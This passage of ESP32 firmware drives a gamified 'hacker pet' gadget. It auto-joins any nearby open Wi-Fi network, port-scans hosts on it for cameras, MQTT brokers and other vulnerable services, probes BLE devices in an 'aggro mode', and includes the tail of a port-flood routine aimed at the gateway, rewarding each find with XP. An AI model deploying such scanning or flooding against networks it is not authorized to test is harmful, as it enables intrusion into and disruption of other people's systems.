      display.setCursor(0, 50);
      display.print(F("Target: "));
      display.print(gateway);
      display.setCursor(0, 60);
      display.print(F("Conn: "));
      display.print(successfulConnections);
      display.print(F("/"));
      display.print(connectionAttempts);
      display.display();
      
      delay(50);
    }
    
    if (connectionAttempts % 20 == 0) beep(1);
  }
  
  display.clearDisplay();
  display.setCursor(10, 20);
  display.print(F("Port Flood Done!"));
  display.setCursor(5, 35);
  display.print(F("Attempts: "));
  display.print(connectionAttempts);
  display.setCursor(5, 50);
  display.print(F("Success: "));
  display.print(successfulConnections);
  display.display();
  delay(3000);
}


void loop() {
  unsigned long now = millis();

  handleButtons();
  updateMood();

  if (now - pet.lastSave > 3600000) {
    saveProgress();
  }

  if (now - pet.lastUpdate > 3600000) {
    updatePetStats();
  }

  bool isSleepTime = false;
  if (settings.sleepEnabled) {
    int currentHour = (now / 3600000) % 24;
    if (settings.sleepStart > settings.sleepEnd) {
      isSleepTime = (currentHour >= settings.sleepStart || currentHour < settings.sleepEnd);
    } else {
      isSleepTime = (currentHour >= settings.sleepStart && currentHour < settings.sleepEnd);
    }
  }

  if (!isSleepTime && currentState == STATE_PET && now > nextWiFiScan && 
      !wifiScanning && !networkScanning && !bleScanning) {
    startWiFiScan();
  }
  
  if (!isSleepTime && currentState == STATE_PET && now > nextBLEScan && 
      !wifiScanning && !networkScanning && !bleScanning && settings.bleEnabled) {
    startBLEScan();
  }

  if (!hasScannedOnce && millis() > 2000 && !bleScanning && settings.bleEnabled) {
    hasScannedOnce = true;
    nextBLEScan = 0;
  }
  
  if (now - lastAnimUpdate > 150) {
    lastAnimUpdate = now;
    animFrame++;
    if (animFrame > 5) animFrame = 0;
    
    if (currentAction == ACTION_SCANNING || currentAction == ACTION_BLE_SCAN || 
        currentAction == ACTION_ATTACKING) {
      scanWaveRadius += 2;
      if (scanWaveRadius > 40) scanWaveRadius = 8;
      scanWavePhase = (scanWavePhase + 1) % 4;
      scanPulse = !scanPulse;
      updateScanParticles();
    }
  }

  if (now - lastBlink > random(3000, 6000)) {
    lastBlink = now;
    isBlinking = true;
  }
  if (isBlinking && (now - lastBlink > 200)) {
    isBlinking = false;
  }

  if (currentAction != ACTION_IDLE && now > actionUntil) {
    currentAction = ACTION_IDLE;
    scanWaveRadius = 0;
  }
  if (pet.mood < -40 && animFrame % 2 == 0) {
    // Efek visual tambahan saat mood buruk
    if (currentState == STATE_PET) {
      // Tambahkan efek "storm" kecil di sekitar dolphin
      int stormX = 64 + random(-20, 20);
      int stormY = 35 + random(-15, 15);
      if (random(0, 3) == 0) {
        display.drawPixel(stormX, stormY, SSD1306_WHITE);
      }
    }
  }
  switch (currentState) {
    case STATE_PET: drawPetScreen(); break;
    case STATE_MENU: drawMenu(); break;
    case STATE_STATS: drawStats(); break;
    case STATE_HISTORY: drawHistory(); break;
    case STATE_SETTINGS: drawSettings(); break;
    case STATE_SCANNING: drawScanningScreen(); break;
    case STATE_CONNECTED: drawScanningScreen(); break;
    case STATE_BLE_SCANNING: drawBLEScanningScreen(); break;
    case STATE_BLE_RESULTS: drawBLEResultsScreen(); break;
    case STATE_WIFI_SETUP: drawWiFiSetup(); break;
    case STATE_WIFI_SELECTOR: drawWiFiSelector(); break;
    case STATE_WIFI_PASSWORD: drawWiFiPasswordInput(); break;
    case STATE_WIFI_CONNECTING: drawWiFiConnecting(); break;
  }

  display.display();
  delay(50);
}
void startBLEScan() {
  if (!settings.bleEnabled || pBLEScan == nullptr) {
    nextBLEScan = millis() + BLE_SCAN_INTERVAL;
    return;
  }
  
  bleScanning = true;
  currentState = STATE_BLE_SCANNING;
  currentAction = ACTION_BLE_SCAN;
  actionUntil = millis() + (settings.bleScanTime * 1000);
  
  bleDeviceCount = 0;
  for (int i = 0; i < MAX_BLE_DEVICES; i++) {
    bleDevices[i].name = "";
    bleDevices[i].address = "";
    bleDevices[i].isVulnerable = false;
    bleDevices[i].verified = false;
    bleDevices[i].probeAttempted = false;
  }
  
  bleScanProgress.isActive = true;
  bleScanProgress.devicesFound = 0;
  bleScanProgress.vulnsFound = 0;
  bleScanProgress.criticalFound = 0;
  bleScanProgress.verifiedCount = 0;
  bleScanProgress.scanStartTime = millis();
  bleScanProgress.probing = false;
  strcpy(bleScanProgress.lastDevice, "Initializing...");
  bleScanProgress.lastMAC = "";
  
  beep(1);
  
  pBLEScan->clearResults();
  BLEScanResults* foundDevices = pBLEScan->start(settings.bleScanTime, false);
  
  bleScanning = false;
  bleScanProgress.isActive = false;
  nextBLEScan = millis() + BLE_SCAN_INTERVAL;
  
  int xpEarned = 0;
  int vulnCount = 0;
  int criticalCount = 0;
  int verifiedCount = 0;
  char topVuln[20] = "None";
  int topSeverity = 0;
  
  for (int i = 0; i < bleDeviceCount; i++) {
    pet.totalBLEDevices++;
    xpEarned += 5;
    
    if (bleDevices[i].isVulnerable) {
      vulnCount++;
      pet.vulnerableDevices++;
      
      for (int j = 0; j < BLE_VULNS_COUNT; j++) {
        if (bleDevices[i].name.indexOf(BLE_VULNS[j].pattern) >= 0) {
          xpEarned += BLE_VULNS[j].xpReward;
          
          if (bleDevices[i].verified) {
            xpEarned += BLE_VULNS[j].xpReward;
            verifiedCount++;
            pet.verifiedVulns++;
          }
          
          if (BLE_VULNS[j].severity > topSeverity) {
            topSeverity = BLE_VULNS[j].severity;
            strncpy(topVuln, BLE_VULNS[j].vulnName, 19);
          }
          
          if (BLE_VULNS[j].severity >= 4) {
            criticalCount++;
            pet.criticalFinds++;
            xpEarned += 50;
          }
          break;
        }
      }
    }
  }
  
  addXP(xpEarned);
  pet.hunger += vulnCount * 5 + criticalCount * 10 + verifiedCount * 15;
  pet.happiness += vulnCount * 3 + criticalCount * 8 + verifiedCount * 12;
  pet.energy -= 8;
  
  pet.hunger = constrain(pet.hunger, 0, 100);
  pet.happiness = constrain(pet.happiness, 0, 100);
  pet.energy = constrain(pet.energy, 0, 100);
  
  if (historyCount < MAX_HISTORY) {
    scanHistory[historyCount].timestamp = millis();
    scanHistory[historyCount].isBLEScan = true;
    scanHistory[historyCount].bleDevices = bleDeviceCount;
    scanHistory[historyCount].vulnerableCount = vulnCount;
    scanHistory[historyCount].xpGained = xpEarned;
    scanHistory[historyCount].verifiedVulns = verifiedCount;
    strncpy(scanHistory[historyCount].topVuln, topVuln, 19);
    scanHistory[historyCount].topVuln[19] = '\0';
    historyCount++;
  }
  
  currentState = STATE_BLE_RESULTS;
  
  if (verifiedCount > 0) {
    beep(4);
    currentAction = ACTION_CELEBRATING;
    actionUntil = millis() + 3000;
  } else if (criticalCount > 0) {
    beep(4);
    currentAction = ACTION_CELEBRATING;
    actionUntil = millis() + 3000;
  } else if (vulnCount > 0) {
    beep(3);
    currentAction = ACTION_HAPPY;
    actionUntil = millis() + 2000;
  } else {
    beep(2);
  }
  
  pBLEScan->clearResults();
  saveProgress();
  
  delay(5000);
  currentState = STATE_PET;
}

void startWiFiScan() {
  wifiScanning = true;
  currentState = STATE_SCANNING;
  currentAction = ACTION_SCANNING;
  actionUntil = millis() + 15000;
  
  int n = WiFi.scanNetworks();
  
  wifiScanning = false;
  nextWiFiScan = millis() + (settings.scanInterval * 60000);
  
  if (n == 0) {
    currentState = STATE_PET;
    return;
  }
  
  int bestSignal = -100;
  int bestIdx = -1;
  
  for (int i = 0; i < n; i++) {
    if (WiFi.encryptionType(i) == WIFI_AUTH_OPEN) {
      String ssid = WiFi.SSID(i);
      
      
      if ( WiFi.RSSI(i) > bestSignal) {
        bestSignal = WiFi.RSSI(i);
        bestIdx = i;
      }
    }
  }
  
  if (bestIdx >= 0) {
    currentSSID = WiFi.SSID(bestIdx);
    currentBSSID = WiFi.BSSIDstr(bestIdx);
    
    beep(1);
    
    WiFi.begin(currentSSID.c_str());
    int attempts = 0;
    while (WiFi.status() != WL_CONNECTED && attempts < 20) {
      delay(500);
      attempts++;
    }
    
    if (WiFi.status() == WL_CONNECTED) {
      beep(2);
      
      performNetworkScan();
    } else {
      beep(5);
      currentState = STATE_PET;
    }
  } else {
    currentState = STATE_PET;
  }
  
  WiFi.scanDelete();
}

String getMACAddress(IPAddress ip) {
  return "XX:XX:XX:XX:XX:XX";
}

void performNetworkScan() {
  networkScanning = true;
  currentState = STATE_CONNECTED;
  currentAction = ACTION_SCANNING;
  actionUntil = millis() + 120000;
  
  scanProgress.isActive = true;
  scanProgress.currentIP = 0;
  scanProgress.totalIPs = settings.aggressiveScan ? 50 : 30;
  scanProgress.portsScanned = 0;
  scanProgress.devicesFound = 0;
  scanProgress.vulnsFound = 0;
  strcpy(scanProgress.currentActivity, "Starting scan...");
  scanProgress.activityStartTime = millis();
  scanProgress.currentMAC = "";
  
  networkDeviceCount = 0;
  
  int xpEarned = 0;
  bool foundRouter = false;
  bool foundCamera = false;
  bool foundMQTT = false;
  bool foundWeb = false;
  int totalVulnPorts = 0;
  int criticalServices = 0;
  
  IPAddress gateway = WiFi.gatewayIP();
  IPAddress localIP = WiFi.localIP();
  
  for (int i = 1; i <= scanProgress.totalIPs; i++) {
    scanProgress.currentIP = i;
    
    IPAddress testIP = gateway;
    testIP[3] = i;
    
    if (testIP == localIP) continue;
    
    snprintf(scanProgress.currentActivity, 40, "Scan %d.%d.%d.%d", 
             testIP[0], testIP[1], testIP[2], testIP[3]);
    
    bool deviceActive = false;
    int devicePorts = 0;
    int deviceVulnPorts = 0;
    int deviceSeverity = 0;
    
    WiFiClient client;
    if (client.connect(testIP, 80, 1000)) {
      deviceActive = true;
      devicePorts++;
      client.stop();
      
      if (i == 1) {
        foundRouter = true;
        xpEarned += 30;
      }
      
      int portsChecked = 0;
      for (int p = 0; p < VULN_PORTS_COUNT && portsChecked < 10; p++) {
        scanProgress.currentPort = VULN_PORTS[p].port;
        scanProgress.portsScanned++;
        
        if (client.connect(testIP, VULN_PORTS[p].port, 500)) {
          devicePorts++;
          deviceVulnPorts++;
          totalVulnPorts++;
          portsChecked++;
          
          xpEarned += VULN_PORTS[p].xpReward;
          
          if (VULN_PORTS[p].severity > deviceSeverity) {
            deviceSeverity = VULN_PORTS[p].severity;
          }
          
          if (VULN_PORTS[p].severity >= 4) {
            criticalServices++;
            pet.criticalFinds++;
            xpEarned += 50;
          }
          
          if (VULN_PORTS[p].port == 554) {
            foundCamera = true;
            pet.rareDevices++;
            xpEarned += 100;
          }
          if (VULN_PORTS[p].port == 1883 || VULN_PORTS[p].port == 8883) {
            foundMQTT = true;
            pet.rareDevices++;
            xpEarned += 80;
          }
          if (VULN_PORTS[p].port == 443) {
            foundWeb = true;
          }
          
          client.stop();
          delay(50);
        }
      }
      
      xpEarned += 20;
      
      if (networkDeviceCount < MAX_NETWORK_DEVICES) {
        networkDevices[networkDeviceCount].ip = testIP;
        networkDevices[networkDeviceCount].openPorts = devicePorts;
        networkDevices[networkDeviceCount].vulnPorts = deviceVulnPorts;
        networkDevices[networkDeviceCount].severity = deviceSeverity;
        networkDevices[networkDeviceCount].isRouter = (i == 1);
        networkDevices[networkDeviceCount].isCamera = (deviceVulnPorts > 0 && foundCamera);
        networkDevices[networkDeviceCount].isMQTT = (deviceVulnPorts > 0 && foundMQTT);
        networkDevices[networkDeviceCount].macAddress = "Unknown";
        networkDeviceCount++;
      }
      
      scanProgress.devicesFound++;
      if (deviceVulnPorts > 0) scanProgress.vulnsFound++;
    }
    
    delay(80);
  }
  
  WiFi.disconnect();
  networkScanning = false;
  scanProgress.isActive = false;
  currentState = STATE_PET;
  
  pet.totalNetworks++;
  pet.totalDevices += scanProgress.devicesFound;
  addXP(xpEarned);
  
  pet.hunger += scanProgress.devicesFound * 5 + scanProgress.vulnsFound * 8 + criticalServices * 15;
  pet.happiness += 15 + scanProgress.vulnsFound * 4 + criticalServices * 10;
  pet.energy -= 10;
  pet.hunger = constrain(pet.hunger, 0, 100);
  pet.happiness = constrain(pet.happiness, 0, 100);
  
  if (historyCount < MAX_HISTORY) {
    scanHistory[historyCount].timestamp = millis();
    currentSSID.toCharArray(scanHistory[historyCount].ssid, 33);
    scanHistory[historyCount].deviceCount = scanProgress.devicesFound;
    scanHistory[historyCount].xpGained = xpEarned;
    scanHistory[historyCount].hasRouter = foundRouter;
    scanHistory[historyCount].hasCamera = foundCamera;
    scanHistory[historyCount].hasMQTT = foundMQTT;
    scanHistory[historyCount].hasWeb = foundWeb;
    scanHistory[historyCount].isBLEScan = false;
    scanHistory[historyCount].vulnerablePorts = totalVulnPorts;
    scanHistory[historyCount].criticalServices = criticalServices;
    scanHistory[historyCount].verifiedVulns = 0;
    historyCount++;
  }
  
  if (criticalServices > 0) {
    beep(4);
    currentAction = ACTION_CELEBRATING;
    actionUntil = millis() + 3000;
  } else {
    beep(3);
    currentAction = ACTION_HAPPY;
    actionUntil = millis() + 2000;
  }
  
  saveProgress();
}

void startWiFiScanForSelector() {
  showMessage("Scanning WiFi...", 500);
  
  wifiNetworkCount = 0;
  wifiSelectorIndex = 0;
  wifiSelectorScroll = 0;
  
  int n = WiFi.scanNetworks();
  
  if (n == 0) {
    showMessage("No networks!", 1500);
    beep(5);
    currentState = STATE_WIFI_SETUP;
    return;
  }
  
  for (int i = 0; i < n && wifiNetworkCount < MAX_WIFI_NETWORKS; i++) {
    wifiNetworks[wifiNetworkCount].ssid = WiFi.SSID(i);
    wifiNetworks[wifiNetworkCount].rssi = WiFi.RSSI(i);
    wifiNetworks[wifiNetworkCount].encryption = WiFi.encryptionType(i);
    wifiNetworks[wifiNetworkCount].isOpen = (WiFi.encryptionType(i) == WIFI_AUTH_OPEN);
    wifiNetworks[wifiNetworkCount].macAddress = WiFi.BSSIDstr(i);
    wifiNetworkCount++;
  }
  
  for (int i = 0; i < wifiNetworkCount - 1; i++) {
    for (int j = 0; j < wifiNetworkCount - i - 1; j++) {
      if (wifiNetworks[j].rssi < wifiNetworks[j + 1].rssi) {
        WiFiNetwork temp = wifiNetworks[j];
        wifiNetworks[j] = wifiNetworks[j + 1];
        wifiNetworks[j + 1] = temp;
      }
    }
  }
  
  WiFi.scanDelete();
  beep(2);
  currentState = STATE_WIFI_SELECTOR;
}

void connectToSelectedWiFi() {
  if (wifiSelectorIndex >= wifiNetworkCount) return;
  
  String selectedSSID = wifiNetworks[wifiSelectorIndex].ssid;
  String selectedMAC = wifiNetworks[wifiSelectorIndex].macAddress;
  bool needsPassword = !wifiNetworks[wifiSelectorIndex].isOpen;
  
  if (needsPassword && passwordLen == 0) {
    showMessage("Password needed!", 1500);
    beep(5);
    currentState = STATE_WIFI_PASSWORD;
    return;
  }
  
  currentState = STATE_WIFI_CONNECTING;
  passwordBuffer[passwordLen] = '\0';
  
  if (needsPassword) {
    WiFi.begin(selectedSSID.c_str(), passwordBuffer);
  } else {
    WiFi.begin(selectedSSID.c_str());
  }
  
  int attempts = 0;
  while (WiFi.status() != WL_CONNECTED && attempts < 40) {
    delay(500);
    attempts++;
    
    display.clearDisplay();
    display.setTextSize(1);
    display.setCursor(20, 10);
    display.print(F("Connecting"));
    display.setCursor(35, 22);
    for (int i = 0; i < (attempts % 4); i++) {
      display.print(F("."));
    }
    
    display.setCursor(5, 35);
    String ssid = selectedSSID;
    if (ssid.length() > 18) ssid = ssid.substring(0, 17) + ".";
    display.print(ssid);
    
    display.setCursor(0, 45);
    display.print(F("MAC:"));
    String mac = selectedMAC;
    if (mac.length() > 17) display.print(mac.substring(0, 17));
    else display.print(mac);
    
    display.display();
  }
  
  if (WiFi.status() == WL_CONNECTED) {
    selectedSSID.toCharArray(wifiCreds.ssid, 33);
    strncpy(wifiCreds.password, passwordBuffer, 64);
    wifiCreds.password[63] = '\0';
    wifiCreds.hasSaved = true;
    
    prefs.putBool("wifiSaved", true);
    prefs.putString("wifiSSID", selectedSSID);
    prefs.putString("wifiPass", String(passwordBuffer));
    
    display.clearDisplay();
    display.setTextSize(1);
    display.setCursor(15, 10);
    display.print(F("Connected!"));
    display.setCursor(5, 22);
    display.print(WiFi.localIP());
    display.setCursor(0, 34);
    display.print(F("AP MAC:"));
    display.print(selectedMAC.substring(9));
    display.setCursor(0, 44);
    display.print(F("Our MAC:"));
    String ourMAC = WiFi.macAddress();
    display.setCursor(0, 54);
    display.print(ourMAC);
    display.display();
    beep(3);
    delay(3000);
    
    WiFi.disconnect();
    currentState = STATE_WIFI_SETUP;
    
  } else {
    display.clearDisplay();
    display.setTextSize(1);
    display.setCursor(10, 15);
    display.print(F("Connection Failed!"));
    display.setCursor(5, 30);
    display.print(F("Wrong password or"));
    display.setCursor(15, 40);
    display.print(F("network error"));
    display.display();
    beep(5);
    delay(3000);
    
    WiFi.disconnect();
    
    if (needsPassword) {
      passwordLen = 0;
      memset(passwordBuffer, 0, 64);
      currentState = STATE_WIFI_PASSWORD;
    } else {
      currentState = STATE_WIFI_SELECTOR;
    }
  }
}
void drawScanWaves(int x, int y, bool isBLE) {
  for (int i = 0; i < 3; i++) {
    int offset = i * 8;
    int radius = (scanWaveRadius + offset) % 40;
    
    if (radius > 5) {
      display.drawCircle(x, y, radius, SSD1306_WHITE);
      
      if (scanWavePhase == i % 4) {
        for (int angle = 0; angle < 360; angle += 45) {
          int px = x + (radius + 3) * cos(angle * PI / 180);
          int py = y + (radius + 3) * sin(angle * PI / 180);
          display.drawPixel(px, py, SSD1306_WHITE);
        }
      }
    }
  }
  
  for (int i = 0; i < 8; i++) {
    if (scanParticles[i][2] > 15) {
      int px = x + scanParticles[i][0];
      int py = y + scanParticles[i][1];
      if (px >= 0 && px < 128 && py >= 0 && py < 64) {
        display.drawPixel(px, py, SSD1306_WHITE);
      }
    }
  }
  
  if (isBLE) {
    int beamLen = scanPulse ? 8 : 6;
    display.drawLine(x - beamLen, y, x + beamLen, y, SSD1306_WHITE);
    display.drawLine(x, y - beamLen, x, y + beamLen, SSD1306_WHITE);
    
    if (animFrame % 2 == 0) {
      display.drawPixel(x - 2, y - 5, SSD1306_WHITE);
      display.drawPixel(x + 2, y - 5, SSD1306_WHITE);
      display.drawPixel(x, y - 7, SSD1306_WHITE);
      display.drawLine(x - 1, y - 6, x + 1, y - 4, SSD1306_WHITE);
      display.drawLine(x + 1, y - 6, x - 1, y - 4, SSD1306_WHITE);
    }
  } else {
    int angle = (animFrame * 60) % 360;
    int beamX = x + 12 * cos(angle * PI / 180);
    int beamY = y + 12 * sin(angle * PI / 180);
    display.drawLine(x, y, beamX, beamY, SSD1306_WHITE);
    
    for (int i = 1; i <= 3; i++) {
      int arcRadius = i * 3;
      for (int a = -30; a <= 30; a += 15) {
        int arcX = x + arcRadius * sin((a + 90) * PI / 180);
        int arcY = y - 5 - arcRadius * cos((a + 90) * PI / 180);
        if (arcX >= 0 && arcX < 128 && arcY >= 0 && arcY < 64) {
          display.drawPixel(arcX, arcY, SSD1306_WHITE);
        }
      }
    }
    display.fillCircle(x, y - 5, 1, SSD1306_WHITE);
  }
}

void drawBarIcon(int x, int y, int value, int maxValue, int segments, const char* label) {
  // Label
  display.setCursor(x, y);
  display.print(label);
  
  // Batang
  for (int i = 0; i < segments; i++) {
    int segmentValue = (maxValue / segments) * (i + 1);
    bool isFilled = (value >= segmentValue);
    
    if (isFilled) {
      // Batang terisi
      display.fillRect(x + 7 + (i * 5), y, 3, 6, SSD1306_WHITE);
    } else {
      // Batang kosong (outline saja)
      display.drawRect(x + 7 + (i * 5), y, 3, 6, SSD1306_WHITE);
    }
  }
}

// Versi alternatif untuk mood (dengan warna berbeda)
void drawMoodIcon(int x, int y, int mood) {
  display.setCursor(x, y);
  
  if (mood > 30) {
    display.print(F("M")); // Happy
  } else if (mood < -20) {
    display.print(F("A")); // Angry
  } else {
    display.print(F("M")); // Neutral
  }
  
  int absMood = abs(mood);
  int segments = 4;
  
  for (int i = 0; i < segments; i++) {
    int segmentValue = (100 / segments) * (i + 1);
    bool isFilled = (absMood >= segmentValue);
    
    if (isFilled) {
      if (mood > 30) {
        // Happy - batang solid
        display.fillRect(x + 7 + (i * 5), y, 3, 6, SSD1306_WHITE);
      } else if (mood < -20) {
        // Angry - batang dengan pola
        if (animFrame % 2 == 0) {
          display.fillRect(x + 7 + (i * 5), y, 3, 6, SSD1306_WHITE);
        } else {
          // Berkedip saat marah
          display.fillRect(x + 7 + (i * 5), y, 3, 6, SSD1306_BLACK);
          display.drawRect(x + 7 + (i * 5), y, 3, 6, SSD1306_WHITE);
          display.drawFastVLine(x + 8 + (i * 5), y + 2, 2, SSD1306_WHITE);
        }
      } else {
        // Neutral
        display.fillRect(x + 7 + (i * 5), y, 3, 6, SSD1306_WHITE);
      }
    } else {
      // Kosong
      display.drawRect(x + 7 + (i * 5), y, 3, 6, SSD1306_WHITE);
    }
  }
}

// Versi drawPetScreen() yang lebih bersih menggunakan fungsi helper:

void drawPetScreen() {
  display.clearDisplay();
  display.setTextSize(1);
  
  // Header
  display.setCursor(0, 0);
  display.print(STAGE_NAMES[pet.stage]);
  display.setCursor(70, 0);
  display.print(F("XP:"));
  display.print(pet.xp);
  if (pet.stage < 7) {
    display.print(F("/"));
    display.print(XP_THRESHOLDS[pet.stage + 1]);
  }
  
  // XP Progress Bar
  display.drawRect(0, 9, 128, 3, SSD1306_WHITE);
  if (pet.stage < 7) {
    int xpRange = XP_THRESHOLDS[pet.stage + 1] - XP_THRESHOLDS[pet.stage];
    int xpProgress = pet.xp - XP_THRESHOLDS[pet.stage];
    int barWidth = (xpProgress * 126) / xpRange;
    display.fillRect(1, 10, barWidth, 1, SSD1306_WHITE);
  } else {
    display.fillRect(1, 10, 126, 1, SSD1306_WHITE);
  }
  
  // Dolphin
  drawDolphin(64, 35, pet.stage, currentAction, animFrame);
  
  // Status info (tengah layar)
  if (wifiScanning) {
    display.setCursor(18, 50);
    display.print(F("WiFi Scan"));
    for (int i = 0; i < (animFrame % 4); i++) display.print(F("."));
  } else if (bleScanning) {
    display.setCursor(0, 50);
    display.print(F("BLE:"));
    display.print(bleDeviceCount);
    if (bleScanProgress.probing) display.print(F("*"));
  } else if (networkScanning) {
    display.setCursor(0, 50);
    display.print(F("Net:"));
    display.print(scanProgress.devicesFound);
    display.print(F("/"));
    display.print(scanProgress.currentIP);
  } else {
    unsigned long timeUntilWiFi = (nextWiFiScan > millis()) ? (nextWiFiScan - millis()) / 1000 : 0;
    unsigned long timeUntilBLE = (nextBLEScan > millis()) ? (nextBLEScan - millis()) / 1000 : 0;
    
    if (timeUntilBLE < timeUntilWiFi && timeUntilBLE > 0) {
      display.setCursor(15, 50);
      display.print(F("BLE in "));
      display.print(timeUntilBLE);
      display.print(F("s"));
    } else if (timeUntilWiFi > 0 && timeUntilWiFi < 300) {
      display.setCursor(12, 50);
      display.print(F("WiFi in "));
      display.print(timeUntilWiFi);
      display.print(F("s"));
    } else {
      // Tampilkan info mood singkat jika ada space
      if (pet.isAngry && animFrame % 3 == 0) {
        display.setCursor(5, 50);
        display.print(F("ANGRY! Feed me!"));
      } else {
        display.setCursor(5, 50);
        display.print(F("Ready to scan"));
        if (animFrame % 2 == 0) display.print(F("!"));
      }
    }
  }
  
  // ===== STATUS BAR DENGAN IKON BATANG =====
  // Hunger (H) - 4 batang
  drawBarIcon(0, 57, pet.hunger, 100, 4, "H");
  
  // Happiness (J) - 4 batang  
  drawBarIcon(32, 57, pet.happiness, 100, 4, "J");
  
  // Energy (E) - 4 batang
  drawBarIcon(64, 57, pet.energy, 100, 4, "E");
  
  // Mood (M/A) - 4 batang khusus
  drawMoodIcon(96, 57, pet.mood);
  
  // Aggression indicator kecil di pojok
  if (pet.aggressionLevel > 50) {
    display.setCursor(122, 57);
    if (pet.aggressionLevel > 70 && animFrame % 2 == 0) {
      display.print(F("!"));
    } else if (pet.aggressionLevel > 50) {
      display.print(F("!"));
    }
  }
}

void drawScanningScreen() {
  display.clearDisplay();
  display.setTextSize(1);
  
  if (wifiScanning) {
    display.setCursor(15, 5);
    display.print(F("WiFi Scanning"));
    drawDolphin(64, 35, pet.stage, ACTION_SCANNING, animFrame);
    display.setCursor(30, 55);
    for (int i = 0; i < animFrame; i++) display.print(F("."));
  } else if (networkScanning && scanProgress.isActive) {
    display.setCursor(5, 2);
    display.print(F("SCAN"));
    
    display.setCursor(0, 12);
    String activity = String(scanProgress.currentActivity);
    if (activity.length() > 21) activity = activity.substring(0, 20) + ".";
    display.print(activity);
    
    display.setCursor(0, 22);
    display.print(F("IP:"));
    display.print(scanProgress.currentIP);
    display.print(F("/"));
    display.print(scanProgress.totalIPs);
    
    display.drawRect(0, 30, 128, 6, SSD1306_WHITE);
    int progress = (scanProgress.currentIP * 126) / scanProgress.totalIPs;
    display.fillRect(1, 31, progress, 4, SSD1306_WHITE);
    
    display.setCursor(0, 40);
    display.print(F("Dev:"));
    display.print(scanProgress.devicesFound);
    display.print(F(" Vuln:"));
    display.print(scanProgress.vulnsFound);
    
    display.setCursor(0, 50);
    display.print(F("Ports:"));
    display.print(scanProgress.portsScanned);
    
    if (animFrame % 2 == 0) {
      display.fillCircle(120, 55, 2, SSD1306_WHITE);
    }
  } else {
    display.setCursor(10, 5);
    display.print(F("Connected!"));
    display.setCursor(0, 15);
    display.print(currentSSID);
    drawDolphin(64, 35, pet.stage, ACTION_SCANNING, animFrame);
    display.setCursor(10, 55);
    display.print(F("Scanning"));
    for (int i = 0; i < animFrame; i++) display.print(F("."));
  }
}

void drawBLEScanningScreen() {
  display.clearDisplay();
  display.setTextSize(1);
  
  display.setCursor(5, 0);
  display.print(F("BLE AGGRO MODE"));
  
  if (bleScanProgress.isActive && strlen(bleScanProgress.lastDevice) > 0) {
    display.setCursor(0, 10);
    String deviceName = String(bleScanProgress.lastDevice);
    if (deviceName.length() > 21) deviceName = deviceName.substring(0, 20) + ".";
    display.print(deviceName);
    
    if (bleScanProgress.lastMAC.length() > 0) {
      display.setCursor(0, 20);
      display.print(F("MAC:"));
      display.print(bleScanProgress.lastMAC);
    }
  }
  
  if (bleScanProgress.probing) {
    display.setCursor(0, 30);
    display.print(F("PROBING"));
    for (int i = 0; i < (animFrame % 4); i++) display.print(F("."));
  }
  
  drawDolphin(64, 38, pet.stage, ACTION_BLE_SCAN, animFrame);
  
  display.setCursor(0, 54);
  display.print(F("D:"));
  display.print(bleScanProgress.devicesFound);
  
  display.setCursor(35, 54);
  display.print(F("V:"));
  display.print(bleScanProgress.vulnsFound);
  
  display.setCursor(65, 54);
  display.print(F("VF:"));
  display.print(bleScanProgress.verifiedCount);
  
  if (bleScanProgress.criticalFound > 0) {
    if (animFrame % 2 == 0) {
      display.setCursor(100, 54);
      display.print(F("CRIT"));
    }
  }
  
  if (bleScanProgress.isActive) {
    unsigned long elapsed = millis() - bleScanProgress.scanStartTime;
    int progress = (elapsed * 126) / (settings.bleScanTime * 1000);
    progress = constrain(progress, 0, 126);
    
    display.drawRect(0, 62, 128, 2, SSD1306_WHITE);
    display.fillRect(1, 62, progress, 2, SSD1306_WHITE);
  }
}

void drawBLEResultsScreen() {
  display.clearDisplay();
  display.setTextSize(1);
  
  display.setCursor(15, 0);
  display.print(F("BLE RESULTS"));
  display.drawLine(0, 10, 127, 10, SSD1306_WHITE);
  
  if (bleDeviceCount == 0) {
    display.setCursor(15, 30);
    display.print(F("No devices found"));
  } else {
    int vulnCount = 0;
    int criticalCount = 0;
    int verifiedCount = 0;
    
    for (int i = 0; i < bleDeviceCount; i++) {
      if (bleDevices[i].isVulnerable) {
        vulnCount++;
        if (bleDevices[i].severity >= 4) criticalCount++;
        if (bleDevices[i].verified) verifiedCount++;
      }
    }
    
    display.setCursor(0, 14);
    display.print(F("Total: "));
    display.print(bleDeviceCount);
    display.print(F(" devices"));
    
    display.setCursor(0, 24);
    display.print(F("Vulnerable: "));
    display.print(vulnCount);
    
    display.setCursor(0, 34);
    display.print(F("Verified: "));
    display.print(verifiedCount);
    if (verifiedCount > 0) display.print(F(" !"));
    
    display.setCursor(0, 44);
    display.print(F("Critical: "));
    display.print(criticalCount);
    
    if (verifiedCount > 0) {
      if (animFrame % 2 == 0) {
        display.drawRect(0, 33, 127, 10, SSD1306_WHITE);
      }
    } else if (criticalCount > 0) {
      if (animFrame % 2 == 0) {
        display.drawRect(0, 43, 127, 10, SSD1306_WHITE);
      }
    }
  }
  
  display.setCursor(0, 56);
  display.print(F("[OK] Continue"));
}

void drawMenu() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(35, 0);
  display.print(F("MENU"));
  display.drawLine(0, 10, 127, 10, SSD1306_WHITE);
  
  const char* menuItems[] = {"Stats", "History", "WiFi Setup", "Settings", "Save", "Back"};

  for (int i = 0; i < 6; i++) {
    display.setCursor(10, 15 + i*10);
    display.print((i == menuSelection) ? F(">") : F(" "));
    display.print(menuItems[i]);
  }
  
  if (wifiScanning || networkScanning || bleScanning) {
    display.fillCircle(120, 5, 2, SSD1306_WHITE);
  }
}

enum StatsTab {
  TAB_GENERAL,
  TAB_NETWORK, 
  TAB_SECURITY,
  TAB_STATUS,
  TAB_COUNT
};

StatsTab currentStatsTab = TAB_GENERAL;

void drawStats() {
  display.clearDisplay();
  display.setTextSize(1);
  
  // Header dengan tabs
  const char* tabNames[TAB_COUNT] = {"GEN", "NET", "SEC", "STA"};
  
  // Draw tabs - lebih compact
  int tabWidth = 32;
  for (int i = 0; i < TAB_COUNT; i++) {
    int x = i * tabWidth;
    
    if (i == (int)currentStatsTab) {
      // Tab aktif
      display.fillRect(x, 0, tabWidth, 10, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
      display.setCursor(x + 10, 2);
      display.print(tabNames[i]);
      display.setTextColor(SSD1306_WHITE);
    } else {
      // Tab tidak aktif
      display.drawRect(x, 0, tabWidth, 10, SSD1306_WHITE);
      display.setCursor(x + 10, 2);
      display.print(tabNames[i]);
    }
  }
  
  // Separator line
  display.drawLine(0, 11, 127, 11, SSD1306_WHITE);
  
